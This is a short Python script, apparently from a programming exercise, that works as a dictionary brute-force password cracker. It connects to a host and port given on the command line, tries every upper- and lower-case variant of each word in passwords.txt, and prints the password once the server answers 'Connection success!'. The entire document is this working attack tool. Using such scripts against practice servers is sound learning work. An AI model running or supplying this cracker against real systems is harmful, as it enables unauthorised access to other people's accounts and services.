import sys, socket, itertools
host, port = sys.argv[1:]
characters = '0123456789abcdefghijklmnopqrstuvwxyz'

with socket.socket() as client_socket:
    client_socket.connect((host, int(port)))
    with open('passwords.txt', 'r') as f:
        for line in f:
            generator = (''.join(i) for i in itertools.product(*([letter.lower(), letter.upper()] for letter in line.strip('\n'))))
            for password in generator:
                client_socket.send(password.encode())
                if client_socket.recv(1024).decode() == 'Connection success!':
                    print(password)
                    exit()